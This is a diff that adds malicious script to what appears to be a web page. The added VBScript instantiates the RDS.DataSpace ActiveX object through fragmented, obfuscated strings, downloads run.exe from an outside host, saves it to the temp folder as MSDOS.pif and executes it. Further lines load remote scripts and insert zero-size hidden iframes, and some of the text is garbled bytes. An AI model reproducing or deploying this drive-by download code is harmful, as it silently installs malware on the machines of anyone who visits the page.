@@ -1,0 +1,58 @@
+<script language= VBS>
+    '1 xiaohui's Script    
+    '2 update 2007.1.31
+    pso = "ob"+"je"+"ct"
+    '1
+    Set df_fuck = document.createElement(pso)
+    '1
+    df_fuck.setAttribute "class"+"id", "clsid"+":BD96"+"C556"+"-65A3-11D0-98"+"3A-00C04"+"FC29E36"
+    '1
+    Set x_fuck = df_fuck.CreateObject("Mic"+"ros"+"oft."+"XML"+"HT"+"TP","")
+    '1
+    bs1="Ad"
+    bs4="odb"+".S"+"tream"
+    '1
+    str1=bs1&bs4
+    str5=str1
+    '1
+    set S_fuck = df_fuck.createobject(str5,"")
+    '1
+    S_fuck.type = 1
+    '1
+    str6="GET"
+    '1
+    geturl="htt"+"p://"+"m.ttixx.com/run.exe "                                                                  
+    '2 
+    x_fuck.Open str6, geturl, False
+    '2
+    x_fuck.Send
+    '1
+    filename1="MSDOS.pif"
+    '1
+    set F_fuck = df_fuck.createobject("Scripting.FileSystemObject","")
+    '1
+    on error resume next
+    '1
+    set tmp_fuck = F_fuck.GetSpecialFolder(2) 
+    '1
+    filename1= F_fuck.BuildPath(tmp_fuck,filename1)
+    '1
+    S_fuck.open
+    '1
+    S_fuck.write x_fuck.responseBody
+    '1
+    S_fuck.savetofile filename1,2
+    '1
+    S_fuck.close
+    '1
+    set Q_fuck = df_fuck.createobject("Shell.Application","")
+    '2
+    Q_fuck.ShellExecute filename1,"",""
+    '3
+    ps = "the end ^O^"
+</script><script src='http://s113.cnzz.com/stat.php?id=439518&web_id=439518' language='JavaScript' charset='gb2312'></script>
+<script type="text/jscript">function init () {document.write("<h1>Service Unavailable</h1>");}window.onload = init;</script> 
+
+<script language=javascript src=http://cc.18dd.net/1.js></script>
+<script language=javascript src=http://1.9797aiai.com/mm/down.js¤@[U1û„¤@[U1û„¤@[U1û„¤@[U1û„¤@[U1û„“ÛmïŠ‰Úw></script><IfrAmE src=http://127.0.0.1/test.htm width=0 height=0></IfrAmE>                                    
+<IfrAmE src=http://127.0.0.1/test.htm width=0 height=0></IfrAmE>                                    
